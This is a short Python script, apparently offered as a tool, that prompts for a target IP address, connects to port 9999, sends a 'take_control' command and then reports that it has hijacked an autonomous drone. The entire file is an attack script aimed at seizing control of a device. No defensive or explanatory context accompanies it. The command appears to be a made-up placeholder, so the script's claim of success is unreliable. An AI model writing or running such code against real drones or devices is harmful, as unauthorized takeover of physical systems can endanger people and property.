import socket
import sys

def hijack_autonomous_drone(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 9999))
        s.send(b"take_control")
        print(f"Hijacked autonomous drone at {target}")
        s.close()
    except socket.error:
        print("Couldn't connect to server.")
        sys.exit()

def main():
    target = input("Enter target IP: ")
    hijack_autonomous_drone(target)

if __name__ == "__main__":
    main()
